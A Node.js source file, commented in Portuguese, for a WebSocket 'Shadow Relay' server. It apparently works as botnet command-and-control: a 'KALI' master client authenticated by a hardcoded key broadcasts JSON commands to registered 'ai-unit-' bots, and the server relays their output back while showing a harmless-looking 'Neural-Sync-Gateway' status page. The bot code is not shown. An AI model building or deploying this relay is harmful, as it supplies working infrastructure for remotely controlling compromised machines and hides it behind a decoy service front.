const WebSocket = require('ws');
const http = require('http');

const COLORS = {
    reset: "\x1b[0m", blue: "\x1b[34m", green: "\x1b[32m", 
    yellow: "\x1b[33m", red: "\x1b[31m", cyan: "\x1b[36m", magenta: "\x1b[35m"
};

// --- CONFIGURAÇÃO DE SEGURANÇA ---
const MASTER_KEY = "SHADOW_MASTER_2026_DAVID"; // Chave interna para validar o Kali

const server = http.createServer((req, res) => {
    const stats = {
        service: "Neural-Sync-Gateway-V3",
        status: "High-Performance",
        uptime: process.uptime().toFixed(2) + "s",
        active_workers: BOTS.size,
        orchestrator_online: !!KALI
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(stats));
});

const wss = new WebSocket.Server({ server, maxPayload: 1024 * 512 }); // Limite de 512KB por mensagem
let KALI = null;
const BOTS = new Map();

const log = (color, type, msg) => {
    const ts = new Date().toISOString().split('T')[1].split('.')[0];
    console.log(`${color}[${ts}] [${type}] ${msg}${COLORS.reset}`);
};

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');
    const key = params.get('key');

    // 1. Validação de Entrada
    if (id === 'KALI') {
        if (key !== MASTER_KEY) {
            log(COLORS.red, "SECURITY", "Tentativa de acesso não autorizado bloqueada!");
            return ws.terminate();
        }
        if (KALI) KALI.terminate();
        KALI = ws;
        log(COLORS.blue, "MASTER", "Orquestrador David autenticado e assumindo controle.");
        
        // Sincronização em lote para otimizar banda
        if (BOTS.size > 0) {
            const botList = Array.from(BOTS.keys());
            KALI.send(JSON.stringify({ t: 'sys', event: 'sync_all', list: botList }));
        }
    } else if (id && id.startsWith('ai-unit-')) {
        BOTS.set(id, ws);
        log(COLORS.green, "NODE", `Unidade registrada: ${id}`);
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
        }
    } else {
        return ws.terminate(); // Recusa IDs inválidos
    }

    // 2. Processamento de Mensagens com Baixa Latência
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            if (ws === KALI) {
                // Direcionamento Inteligente
                if (data.to === 'ALL') {
                    const cmd = JSON.stringify(data.cmd);
                    BOTS.forEach(client => client.send(cmd));
                } else {
                    const target = BOTS.get(data.to);
                    if (target) target.send(JSON.stringify(data.cmd));
                }
            } else {
                // Filtro de Resposta (Node -> Kali)
                if (KALI && KALI.readyState === WebSocket.OPEN) {
                    KALI.send(json_relay(id, data));
                }
            }
        } catch (e) {
            // Repasse de emergência para mensagens binárias/brutas
            if (ws !== KALI && KALI) {
                KALI.send(JSON.stringify({ t: 'res', f: id, raw: true, d: message.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
            log(COLORS.magenta, "ALERT", "Orquestrador desconectado. Entrando em modo de espera.");
        } else {
            BOTS.delete(id);
            log(COLORS.yellow, "NODE", `Unidade removida: ${id}`);
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
            }
        }
    });

    ws.on('error', () => ws.terminate());
});

function json_relay(from, data) {
    return JSON.stringify({ t: 'res', f: from, d: data, ts: Date.now() });
}

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    log(COLORS.cyan, "SYSTEM", `Shadow Relay v3.0 em execução na porta ${PORT}`);
});
